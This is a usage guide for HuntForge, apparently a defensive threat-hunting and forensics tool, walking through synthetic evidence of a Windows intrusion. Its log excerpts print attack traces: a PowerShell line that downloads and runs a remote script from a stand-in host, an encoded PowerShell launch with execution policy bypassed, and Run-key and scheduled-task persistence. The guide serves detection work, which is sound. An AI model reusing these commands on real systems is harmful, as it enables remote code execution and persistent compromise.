# HuntForge Usage Guide

Scenario-driven walkthroughs for HuntForge. All output below is
genuine — produced by running the commands against synthetic evidence.

## Scenario (v0.7): correlating the intrusion chain into one narrative

The same intrusion chain (invoice doc → PowerShell `-enc` → outbound
connection → dropped payload → Run-key persistence), now correlated
*across sources*. Twelve events went in — Sysmon process, network and
file telemetry, a prefetch entry, registry Run keys. v0.7's linkage
heuristics join four of them into one activity cluster; the rest stay
honestly uncorrelated.

### 1. Correlate the case

```console
$ huntforge correlate --case CASE-007
1 activity cluster(s) from 12 event(s), 3 linkage(s)
  [0] confidence 80 — 4 event(s), findings: 2 high, 1 medium [T1059.001, T1204.002, T1547.001]
      same-process: #4 <-> #5 (INFERRED, conf 90)
      same-process: #5 <-> #6 (INFERRED, conf 90)
      same-file: #6 <-> #9 (INFERRED, conf 80)
  linkages: same-file: 1, same-process: 2
  uncorrelated events: 8
  note: linkages are INFERRED hypotheses; events are OBSERVED facts
```

Three linkages, all labeled INFERRED: the PowerShell process creation
(#4) and its outbound connection (#5) share host + PID + image 21
seconds apart; the file write (#6) is the same process instance
again; and the Run-key value (#9) points at the exact normalized path
of the dropped file. Eight events didn't link — a second Run key for
a binary never seen executing, a service with a writable image, a
prefetch entry whose executable doesn't match — and HuntForge says so
instead of forcing them into the story.

### 2. Read the narrative

```console
$ huntforge narrative --case CASE-007 --cluster 0
cluster 0: powershell.exe on WS-FIN-014: 4 event(s), 3 finding(s); top finding: Run-key persistence (medium) (confidence 80)
  powershell.exe on WS-FIN-014: 4 event(s), 3 finding(s); top finding: Run-key persistence (medium)
  confidence 80: weakest linkage: same-file (events #6/#9, confidence 80)
  OBSERVED (4 events):
    2026-10-02T09:12:41Z [#4] sysmon:1 powershell.exe (pid 7422): powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG
    2026-10-02T09:13:02Z [#5] sysmon:3 powershell.exe (pid 7422); -> 203.0.113.44:443
    2026-10-02T09:13:20Z [#6] sysmon:11 powershell.exe (pid 7422); file C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
    2026-10-02T09:14:55Z [#9] registry:run-key svchost.exe: C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe /silent; file C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe; registry Software\Microsoft\Windows\CurrentVersion\Run\Updater
  INFERRED linkages (3):
    [same-process] events #4 and #5 are hypothesized to describe the same activity (same-process): same host (ws-fin-014), PID 7422, and image (powershell.exe); 21s apart
        confidence 90: host + numeric PID + image basename all agree within a 15-minute window; distinct process instances rarely share all three
    [same-process] events #5 and #6 are hypothesized to describe the same activity (same-process): same host (ws-fin-014), PID 7422, and image (powershell.exe); 18s apart
        confidence 90: host + numeric PID + image basename all agree within a 15-minute window; distinct process instances rarely share all three
    [same-file] events #6 and #9 are hypothesized to describe the same activity (same-file): same normalized file path: c:\users\m.alvarez\appdata\local\temp\svchost.exe
        confidence 80: exact normalized path agreement across two events; unrelated events rarely reference the identical path
  detections (3):
    [HF-0001] high Encoded PowerShell execution (conf 80)
    [HF-0002] high Office application spawning shell/script interpreter (conf 70)
    [HF-0005] medium Run-key persistence (conf 60)
  techniques:
    T1059.001 PowerShell
    T1204.002 Malicious File
    T1547.001 Registry Run Keys / Startup Folder
  entities (11):
    file: c:\users\m.alvarez\appdata\local\temp\svchost.exe (2 observation(s))
    …
  what's missing (2):
    - file C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe was created but never observed executing — it may be dormant, deleted before execution, or executed outside collection
    - persistence points to C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe, but C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe was never observed executing in this case — the payload may not have run yet, or execution evidence was not collected
```

The narrative keeps OBSERVED and INFERRED in separate sections, shows
its work for every linkage (basis, confidence *with reasoning*, and
the failure modes live in [CORRELATION.md](CORRELATION.md)), and ends
with what's missing instead of pretending the picture is complete.
Cluster confidence is the weakest linkage — 80 here, named
explicitly — never an average that would hide the doubt.

![HuntForge v0.7 correlation](images/07-correlate.png)

### Honest limitations (v0.7)

- Linkages are deterministic hypotheses, not evidence: PID reuse,
  basename collisions, and temporal coincidence are documented
  failure modes for each heuristic.
- Untimed events are never linked — without a real timestamp, any
  temporal claim would be invented.
- Correlation never changes detections: findings still come from
  `huntforge detect`; clusters only organize them.

## Scenario (v0.6): ATT&CK mapping and Sigma rules

The same intrusion chain (invoice doc → PowerShell `-enc` → outbound
connection → dropped payload → Run-key persistence), now mapped to
MITRE ATT&CK. Detections already ran (`huntforge detect` stores its
findings in the case); v0.6 reads those stored findings and shows
which techniques have evidence — and which don't.

### 1. Technique coverage

```console
$ huntforge mitre --case CASE-006
technique coverage: 5 of 23 techniques have findings (7 stored finding(s))
  T1053.005 Scheduled Task/Job [Execution/Persistence/Privilege Escalation]
    HF-DET-TASK x1
    findings: HF-0007
  T1059.001 PowerShell [Execution]
    HF-DET-ENCPSH x2
    findings: HF-0002, HF-0003
  T1105 Ingress Tool Transfer [Command and Control]
    HF-DET-DLPSH x1
    findings: HF-0001
  T1204.002 Malicious File [Execution]
    HF-DET-OFFICE x2
    findings: HF-0004, HF-0005
  T1547.001 Registry Run Keys / Startup Folder [Persistence]
    HF-DET-RUNKEY x1
    findings: HF-0006
  gaps (no findings in this case): T1003.001, T1016, T1021.001, T1033, …
  not observable with current parsers: T1003.001, T1070.001, T1070.004
```

Five techniques evidenced, eighteen gaps. The gaps are honest: some
techniques genuinely have no evidence here (no brute-forcing in this
chain), and three — LSASS access, event-log clearing, file deletion —
are techniques HuntForge *cannot* observe yet (the parsers don't read
those event IDs). A gap is a gap in evidence, not proof of absence.
Note what is *not* claimed: `T1566.001` (spearphishing attachment)
stays a gap because HuntForge sees the Office execution, never the
delivery email.

### 2. Run a Sigma rule

```console
$ huntforge sigma run --case CASE-006 --rule hf-sigma-0001
1 finding(s) from sigma rule hf-sigma-0001
  [HF-0008] HIGH hf-sigma-0001 — Encoded PowerShell Command Line (confidence 70)
    why: selection 'selection' matched (command_line matches '*-EncodedCommand*'; process_name matches '*powershell.exe')
    evidence: event #4 (sysmon:1) — sigma selections matched: selection
$ huntforge sigma list
4 bundled sample rule(s)
  hf-sigma-0001 [high] Encoded PowerShell Command Line (T1059.001) — encoded_powershell.json
  hf-sigma-0002 [high] Office Application Spawning Shell (T1204.002) — office_spawns_shell.json
  hf-sigma-0004 [low] Outbound Connection To Rare External Port (T1571) — rare_outbound_port.yaml
  hf-sigma-0003 [medium] Run Key Persistence Registry Write (T1547.001) — runkey_persistence.json
```

Sigma findings persist like built-in ones (exit 1), keep provenance
`huntforge.sigma` v0.6.0, and their `attack.t*` tags become `mitre`
IDs — so `huntforge mitre --case` covers them too. Bare names resolve
against the bundled samples; anything else takes a `.json`/`.yaml`
path. The supported subset is documented in [ATTACK.md](ATTACK.md):
unsupported Sigma features fail loudly at load time, never silently.

### 3. Browse the table

```console
$ huntforge mitre techniques
  T1059.001 PowerShell [Execution]
    observable via: sysmon:1, evtx:Security:4688, powershell:4103, powershell:4104
  …
  T1003.001 LSASS Memory [Credential Access]
    not observable with current parsers (coverage gap)
```

![HuntForge v0.6 ATT&CK coverage](images/06-mitre.png)

### Honest limitations (v0.6)

- The technique table is a curated 23-technique subset, not the full
  ATT&CK matrix — stamped with its snapshot, versioned, offline.
- A mapped finding is evidence of technique *use*, never attribution
  of actor intent.
- Sigma support is a subset: no `|contains`-style modifiers (use `*`
  wildcards), no aggregations, no `near`, no nested selections.

## Scenario (v0.5): explainable detections

The same intrusion chain (invoice doc → PowerShell `-enc` → outbound
connection → dropped payload → Run-key persistence), now run through
v0.5's detection rules. Every finding cites its evidence and shows its
reasoning — HuntForge reports *observed technique-shaped patterns*,
never verdicts.

### 1. Run the rule catalog

```console
$ huntforge detect --case CASE-005 --severity medium+
3 finding(s): 2 high, 1 medium
  [HF-0001] HIGH HF-DET-ENCPSH — Encoded PowerShell execution (confidence 80)
    why: parser observation 'encoded-command' on event #2 (not a verdict — see rule docs)
    why: command line contains an -EncodedCommand/-enc switch
    why: process is powershell.exe (PowerShell host)
    evidence: event #2 (sysmon:1) — process creation: powershell.exe pid 7422, command line indicates encoded execution
  [HF-0002] HIGH HF-DET-OFFICE — Office application spawning shell/script interpreter (confidence 70)
    why: parent process is winword.exe (Office application)
    why: child process is powershell.exe (shell/script host)
    why: parent pid 3131 -> child pid 7422 on event #2
    evidence: event #2 (sysmon:1) — process ancestry: winword.exe (pid 3131) -> powershell.exe (pid 7422)
  [HF-0003] MEDIUM HF-DET-RUNKEY — Run-key persistence (confidence 60)
    why: registry Run/RunOnce value sets persistence: HKCU\...\CurrentVersion\Run\Updater
    why: persistence target: C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
    why: no execution of the target binary observed in this case
    evidence: event #5 (sysmon:13) — Run-key value: HKCU\...\CurrentVersion\Run\Updater
```

Exit code is `1` — findings exist (not an error). Rules with no
applicable telemetry are named at the end, so "no findings" is
distinguishable from "no data".

### 2. Explain one finding

```console
$ huntforge detect --case CASE-005 --rule HF-DET-ENCPSH --explain
1 finding(s): 1 high
  [HF-0001] HIGH HF-DET-ENCPSH — Encoded PowerShell execution (confidence 80)
    why: parser observation 'encoded-command' on event #2 (not a verdict — see rule docs)
    why: command line contains an -EncodedCommand/-enc switch
    why: process is powershell.exe (PowerShell host)
    evidence: event #2 (sysmon:1) — process creation: powershell.exe pid 7422, command line indicates encoded execution
    what: PowerShell executed with an encoded command on WS-FIN-014 as FIN-014\m.alvarez: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG8ALgBGAFkAcwBpAG8AbgBdADoA
    confidence: Encoded execution is a well-known obfuscation technique, but administrators also use -EncodedCommand legitimately; one signal alone cannot confirm intent.
    observed: powershell.exe started with an encoded-command switch at 2026-10-02T09:12:41Z
    inferred (analyst decides): the actor may be hiding the true command from casual inspection (analyst judgment required)
```

### 3. Narrow the run

```console
$ huntforge detect --case CASE-005 --rule HF-DET-RUNKEY --severity medium
$ huntforge rules list          # the 10-rule catalog with severities
$ huntforge detect --case CASE-005 --json | python -c "import json,sys; print(json.load(sys.stdin)['data']['by_severity'])"
```

Findings are stored in the case (`HF-0001`, `HF-0002`, …) alongside
the v0.1 case data, and appear in the result envelope's `findings`
list. The full rule catalog — logic, false-positive profiles,
evidence requirements — lives in [DETECTIONS.md](DETECTIONS.md).

![HuntForge v0.5 detections](images/05-detect.png)

### Honest limitations (v0.5)

- Detections are heuristics, not verdicts: no v0.5 rule emits
  `critical`, and every finding separates observed facts from
  inferences.
- Rules only see normalized fields — without command-line logging
  (Sysmon config / 4688 auditing), several rules cannot fire.
- The writable-directory and executable-path heuristics are
  string-based; obfuscated command lines may be missed or misread.
- `HF-DET-ADMINHOST` needs history to establish "normal" sources; a
  case that starts mid-incident has no baseline.

## Scenario (v0.4): reconstruct the intrusion

The v0.2 intrusion chain (invoice doc → PowerShell `-enc` → outbound
connection → dropped payload → Run-key persistence) now has matching
Prefetch, scheduled-task, and registry-hive artifacts. v0.4's
observation tools — timeline, lineage, entities — reconstruct the
attack from all of them at once. No verdicts: these commands
reorganize what was ingested; judgments are the analyst's (and v0.5's).

### 1. Create a case and ingest

```console
$ huntforge case create CASE-004 --name "Intrusion reconstruction"
case 'CASE-004' created
$ huntforge ingest ./evidence-intrusion --case CASE-004
registered 5 evidence file(s), parsed 14 event(s) [prefetch: 1, registry: 4, security: 3, sysmon: 5, tasks: 1]
```

### 2. One timeline across every source

```console
$ huntforge timeline --case CASE-004
timeline: 14 timed event(s), 0 untimed
  sources: evtx:Security: 3, prefetch: 1, registry: 2, services: 2, sysmon: 5, tasks: 1
  timed (14):
    2026-10-02T08:57:58Z [7] evtx:Security:4624 host=WS-FIN-014 user=FIN-014\m.alvarez process=-
    2026-10-02T09:11:03Z [10] WINWORD.EXE(3131) started by explorer.exe(2048)
    2026-10-02T09:12:41Z [1] POWERSHELL.EXE executed (prefetch evidence, run_count=3)
    2026-10-02T09:12:41Z [9] powershell.exe(7422) created (parent WINWORD.EXE)
    2026-10-02T09:12:41Z [11] powershell.exe(7422) started by WINWORD.EXE(3131)
    2026-10-02T09:13:02Z [12] powershell.exe(7422) -> 203.0.113.44:443 (from 192.168.1.50)
    2026-10-02T09:13:20Z [13] powershell.exe(7422) created file C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
    2026-10-02T09:14:55Z [2] persistence: Software\Microsoft\Windows\CurrentVersion\Run\Updater
    2026-10-02T09:14:55Z [3] persistence: Software\Microsoft\Windows\CurrentVersion\RunOnce\Once
    2026-10-02T09:14:55Z [14] svchost.exe(8110) registry HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater
    2026-10-02T09:15:00Z [6] scheduled task: task \Updater | triggers=LogonTrigger@2026-10-02T09:15:00
    2026-10-02T09:15:44Z [8] evtx:Security:4625 host=WS-FIN-014 user=CORP\Administrator process=-
```

Telemetry and forensics interleave: the Sysmon process creation, the
Prefetch execution evidence, the registry persistence scan, and the
scheduled task all land on one UTC-normalized timeline, each keeping
its verbatim original timestamp. Narrow the window with
`--from`/`--to`, or one source with `--source sysmon`. Events whose
parser could not recover an original timestamp are listed under
`untimed` — never dropped, never placed.

### 3. Process lineage

```console
$ huntforge lineage --case CASE-004
lineage: 2 process instance(s)
  WINWORD.EXE (3131)  [2026-10-02T09:11:03Z] user=FIN-014\m.alvarez  <parent pid 2048 not observed>
     └─ powershell.exe (7422)  [2026-10-02T09:12:41Z] user=FIN-014\m.alvarez  <2 related event(s)>
```

The Sysmon and Security creation records for PID 7422 describe the
same start, so they merge into one instance; the network connection
and file drop attach as corroborating references. The parent PID 2048
was never observed, so it is labeled as such — not invented.
Focus with `--pid 7422` or `--image powershell`.

PID reuse is handled honestly: if PID 7422 later starts a different
image, the two become separate instances, the reused PID is flagged,
and a child of that PID links to the latest plausible parent with an
explicit `ambiguous parent` note naming every candidate.

### 4. Entities across sources

```console
$ huntforge entities --case CASE-004 --type user
4 entities of type user
  user:
    administrator@corp (seen as: CORP\Administrator) — 1 observation(s) [evtx:Security]
    localsystem (seen as: LocalSystem) — 1 observation(s) [services]
    m.alvarez@fin-014 (seen as: FIN-014\m.alvarez) — 8 observation(s) [evtx:Security, sysmon, tasks]
    networkservice@nt authority (seen as: NT AUTHORITY\NetworkService) — 1 observation(s) [services]
$ huntforge entities --case CASE-004 --type ip
4 entities of type ip
  ip:
    127.0.0.1 — 1 observation(s) [evtx:Security]
    192.168.1.50 — 1 observation(s) [sysmon]
    203.0.113.44 — 1 observation(s) [sysmon]
    203.0.113.99 — 1 observation(s) [evtx:Security]
```

`FIN-014\m.alvarez` and `m.alvarez@fin-014` resolve to one entity;
hosts, file paths, registry keys, and hashes normalize the same way,
with every observed spelling kept. All three commands emit the same
data as JSON with `--json`.

![HuntForge v0.4 timeline, lineage, entities](images/04-timeline.png)

### Honest limitations (v0.4)

- Timeline ordering is only as good as source clocks; clock skew
  between hosts is not corrected.
- Lineage links a child to the latest parent instance whose start
  precedes the child's; short-lived processes that exit before their
  child is recorded can mislead the heuristic — the ambiguity note is
  the safety net, not a guarantee.
- Entities normalize mechanically (`DOMAIN\user` → `user@domain`,
  case-insensitive paths/hosts); distinct users sharing a name on
  different domains are kept distinct, but lookalike Unicode names are
  not canonicalized.

## Scenario (v0.3): persistence artifacts

A workstation was reimaged, but you kept forensic copies: a Prefetch
file, an `NTUSER.DAT`, a Task Scheduler export and a service listing.
HuntForge parses them offline — it never touches the live system —
and normalizes everything into the same event model as the v0.2
telemetry.

### 1. Create a case and ingest

```console
$ huntforge case create CASE-003 --name "Persistence hunt"
case 'CASE-003' created
$ huntforge ingest ./evidence-persist --case CASE-003
registered 4 evidence file(s), parsed 10 event(s) [prefetch: 1, registry: 5, services: 3, tasks: 1]
  #1 malware_run.pf sha256=065b75661ef09943…
  #2 services_export.json sha256=74afc2a2fdb2ba34…
  #3 synthetic_hive.dat sha256=1f4f2c3f539dacc4…
  #4 task_malicious.xml sha256=e4004ca3290c4c81…
```

Source kinds are auto-detected by content: `SCCA` magic for Prefetch,
`regf` magic for hives, the `<Task>` root for Task Scheduler XML, and
`"image_path"` fields for service listings. Override with
`--source prefetch|registry|tasks|services`.

### 2. What ran? Ask Prefetch

Each `.pf` file becomes one execution-evidence event — executable,
run count, most recent run:

```console
$ huntforge events --case CASE-003 --keyword MALWARE
1 event(s) match
[1] 2026-10-01T08:30:00Z prefetch:prefetch host=- user=- process=MALWARE.EXE(-)
      file_path: MALWARE.EXE
```

The event's `raw` field records `run_count=14` and the referenced-file
count. Prefetch versions 23/26/30 are supported; compressed (MAM)
prefetch is rejected with a clean error.

### 3. Read the hive directly

`huntforge registry` reads forensic hive copies without a case —
list subkeys and decode values (`REG_SZ`, `REG_DWORD`, `REG_BINARY`,
`REG_MULTI_SZ`, `REG_EXPAND_SZ`, `REG_QWORD`):

```console
$ huntforge registry NTUSER.DAT 'Software\Microsoft\Windows\CurrentVersion\Run'
Software\Microsoft\Windows\CurrentVersion\Run: 0 subkey(s), 2 value(s)
  path: Software\Microsoft\Windows\CurrentVersion\Run
  last_write: 2026-09-15T08:30:00Z
  subkeys (0):
  values (2):
    Updater [REG_SZ] = C:\Users\test\AppData\Roaming\updater.exe --silent
    BadThing [REG_SZ] = C:\Temp\evil.exe
```

Ingest also scans every hive for persistence automatically: `Run` /
`RunOnce` values become `registry:run-key` events timestamped by the
key's last-write time:

```console
$ huntforge events --case CASE-003 --event-id run-key --limit 2
2 event(s) match
[5] 2026-09-15T08:30:00Z registry:run-key host=- user=- process=updater.exe(-)
      command_line: C:\Users\test\AppData\Roaming\updater.exe --silent
      registry_key: Software\Microsoft\Windows\CurrentVersion\Run\Updater
[6] 2026-09-15T08:30:00Z registry:run-key host=- user=- process=evil.exe(-)
      command_line: C:\Temp\evil.exe
      registry_key: Software\Microsoft\Windows\CurrentVersion\Run\BadThing
```

### 4. Services and scheduled tasks

Services come from a JSON export or straight from a `SYSTEM` hive's
`Services` key. Parser flags are observations, never verdicts:

```console
$ huntforge events --case CASE-003 --event-id service
[8] 2026-09-15T08:30:00Z services:service host=- user=LocalSystem process=badsvc.exe(-)
      command_line: C:\Temp\badsvc.exe -k netsvcs
      registry_key: ControlSet001\Services\BadSvc
      flags: auto-start, image-in-temp-dir (parser observation)
...
[4] 2026-10-03T04:16:38Z services:service host=- user=LocalSystem process=unquoted.exe(-)
      command_line: C:\Program Files\Vendor\unquoted.exe --run
      flags: unquoted-service-path (parser observation)
```

And the scheduled task — triggers, action, and the account it runs as:

```console
$ huntforge events --case CASE-003 --event-id task
1 event(s) match
[10] 2026-09-28T14:30:00Z tasks:task host=- user=S-1-5-18 process=evil.exe(-)
      command_line: C:\Temp\evil.exe --silent --persist
      flags: runs-as-system, action-in-temp-dir (parser observation)
```

`MALWARE.EXE` ran 14 times, a `Run` key points at `C:\Temp\evil.exe`,
and a SYSTEM task executes the same binary at logon — three
independent artifacts telling one story. What you conclude from that
is your call: HuntForge records observations, v0.5 will add
explainable detections.

![HuntForge v0.3 persistence artifacts](images/03-persistence.png)

### Honest limitations (v0.3)

- Prefetch: versions 23/26/30 only; compressed MAM prefetch and
  version 31 are rejected with guidance. Trace-chain arrays are not
  parsed.
- Registry: no transaction-log replay, no deleted-cell recovery, no
  multi-cell (`db`) large values, no security descriptors.
- Parsers are validated against synthetic fixtures built to the
  published layouts; validation against live forensic copies is
  pending.

## Scenario (v0.2): from log export to process lineage

You have a finance workstation (`WS-FIN-014`) and a hunch that
something ran PowerShell this morning. In v0.1 you would replay a
JSONL fixture; in v0.2 you ingest the real thing: Sysmon, Security
and PowerShell operational logs exported to XML/JSON.

### 1. Export the logs (on the Windows host)

HuntForge does **not** parse binary `.evtx` files — export them first.
The adapter detects binary EVTX by magic bytes and tells you exactly
what to run:

```console
$ huntforge ingest ./evidence --case CASE-001
# if evidence contains a raw .evtx:
#   warnings (1):
#     - Security.evtx: binary EVTX detected — export it to XML first:
#       wevtutil qe "C:\path\to\Security.evtx" /lf:true /f:xml > Security.xml
```

On the Windows machine:

```console
C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Security.evtx" /lf:true /f:xml > Security.xml
C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" /lf:true /f:xml > Sysmon.xml
C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" /lf:true /f:xml > PowerShell.xml
```

JSON exports (`wevtutil qe /f:json`, or array/`{"Events": [...]}`/JSONL
shapes) work too. Everything stays offline — no network calls, no
subprocesses.

### 2. Create a case and ingest

```console
$ huntforge case create CASE-001 --name "Compromised workstation"
case 'CASE-001' created
$ huntforge ingest ./evidence --case CASE-001
registered 3 evidence file(s), parsed 16 event(s) [powershell: 4, security: 5, sysmon: 7]
  #1 powershell_events.xml sha256=d2f1ff8aab11a161…
  #2 security_events.xml sha256=6f7721d5227b1e06…
  #3 sysmon_intrusion.xml sha256=a8c7da2f74ab43a3…
```

The source kind is auto-detected **by content** (XML root/channel,
JSON fields, magic bytes) — never by file extension. Override it with
`--source sysmon|security|powershell|evtx-xml`; skip parsing entirely
with `--no-parse`. Unrecognized files are still registered as
evidence; malformed records become warnings, never a crash, and
ingest always exits 0.

Each parsed event lands in the normalized model with full provenance
(source file, record index, parser name/version, ingest time, source
SHA-256) and the 7-fractional-digit Windows timestamps are preserved
exactly in `timestamp_original`.

### 3. Hunt: process lineage

```console
$ huntforge events --case CASE-001 --process powershell.exe
4 event(s) match
[8] 2026-10-02T09:12:41Z evtx:Security:4688 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG8ALgBGAFkAcwBpAG8AbgBdADoA
      flags: encoded-command (parser observation)
[13] 2026-10-02T09:12:41Z sysmon:1 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG8ALgBGAFkAcwBpAG8AbgBdADoA
      flags: encoded-command (parser observation)
[14] 2026-10-02T09:13:02Z sysmon:3 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      dst_ip: 203.0.113.44
[15] 2026-10-02T09:13:20Z sysmon:11 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      file_path: C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
```

Two sources agree on the launch: the Security log's 4688 (hex PIDs
decoded — `0x1cfe` → 7422) and Sysmon's EventID 1 (parent
`WINWORD.EXE`, pid 3131, full hashes). The `encoded-command` flag is a
**parser observation, not a verdict** — it records that `-enc`
appeared on the command line. Detections arrive in v0.5; until then
the judgment is yours.

Then the rest of the chain — persistence and the script that ran:

```console
$ huntforge events --case CASE-001 --event-id 13
[16] 2026-10-02T09:14:55Z sysmon:13 svchost.exe(8110)
      registry_key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater
$ huntforge events --case CASE-001 --event-id 4104
1 event(s) match
[1] 2026-10-02T09:12:41Z powershell:4104 host=WS-FIN-014 user=S-1-5-21-1111111111-2222222222-3333333333-1001 process=-(-)
      command_line: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage1.ps1')
```

Script-block text is captured from 4104 records; large blocks span
several 4104 records sharing one `ScriptBlockId`, noted in `raw` so
you can reassemble them.

![HuntForge v0.2 telemetry ingest](images/02-ingest.png)

### 4. Automation and audit

Every command accepts `--json` for the stable result envelope; the
ingest summary now includes `parsed_events`, `parsed_by_source` and
`parse_warnings`. Filters combine with AND:

```console
$ huntforge events --case CASE-001 --host WS-FIN-014 --user m.alvarez --json
$ huntforge audit --case CASE-001   # every invocation is logged
```

Exit codes: `0` success (including "no events match" and
parse warnings), `2` usage/operational error.

## What's next

v0.4 builds the unified timeline and process lineage on top of the
events ingested here.

---

## Scenario (v0.1): a compromised workstation

You have two exported event logs from a finance workstation
(`Security.evtx`, `Sysmon.evtx`) and a hunch that something ran
PowerShell this morning. The v0.1 workflow: create a case, ingest the
evidence, load normalized events, hunt.

> **Note (v0.1):** native EVTX/Sysmon parsers arrive in v0.2. Ingest
> registers and hashes your evidence files today; normalized events
> are loaded from a JSONL fixture (one JSON object per line matching
> the event schema — see `huntforge.models.events`). The fixture
> below replays the classic chain: malicious doc → PowerShell with an
> encoded command → outbound connection → dropped payload → Run-key
> persistence.

### 1. Create a case

```console
$ huntforge case create CASE-001 --name "Compromised workstation"
case 'CASE-001' created
  events: 0  evidence: 0
```

Cases live in `~/.huntforge/cases/CASE-001/store.db` (override with
`HUNTFORGE_STATE_DIR`). The case id is validated — `../evil` is
rejected — so evidence can't escape the state directory.

### 2. Ingest evidence and load events

```console
$ huntforge ingest ./evidence --case CASE-001 --fixture events.jsonl
registered 2 evidence file(s), loaded 5 event(s)
  #1 Security.evtx sha256=d74ce96af36ed6c5…
  #2 Sysmon.evtx sha256=b01876480664fc03…
```

Ingest hashes every file (SHA-256 + MD5), records size and ingest
time, and dedupes by hash — the source files are never modified. Each
loaded event gets provenance: source file, record index, parser
(`fixture-loader` v0.1.0), ingest time, and the fixture's SHA-256.

### 3. Hunt: what did PowerShell do?

```console
$ huntforge events --case CASE-001 --process powershell.exe
3 event(s) match
[2] 2026-10-02T09:12:41Z sysmon:1 powershell.exe(7422)
      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBm...
[3] 2026-10-02T09:13:02Z sysmon:3 powershell.exe(7422)
      dst_ip: 203.0.113.44
[4] 2026-10-02T09:13:20Z sysmon:11 powershell.exe(7422)
      file_path: C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
```

Three observations, all with provenance: an encoded PowerShell launch
38 seconds after `winword.exe` opened `invoice.doc`, an outbound
connection to `203.0.113.44:443`, and a file write of `svchost.exe`
into a user Temp directory. HuntForge reports these as **observed
facts** — it does not label them malicious. That judgment is yours.

### 4. Hunt: persistence

```console
$ huntforge events --case CASE-001 --keyword Run
1 event(s) match
[5] 2026-10-02T09:14:55Z sysmon:13 svchost.exe(8110)
      registry_key: HKCU\...\CurrentVersion\Run\Updater
```

![HuntForge scenario walkthrough](images/01-scenario.png)

### 5. Automation and audit

Every command accepts `--json` for a stable result envelope
(`tool`, `version`, `command`, `timestamp`, `status`, `summary`,
`data`, `findings`, `events`). Filters combine with AND:

```console
$ huntforge events --case CASE-001 --host WS-FIN-014 --user m.alvarez --json
$ huntforge audit --case CASE-001   # every invocation is logged
```

Exit codes: `0` success (including "no events match"),
`2` usage/operational error.

## What's next

v0.2 replaces the fixture step with real EVTX/Sysmon/PowerShell
parsers — the event model and provenance above stay exactly the same,
so today's queries and fixtures keep working.
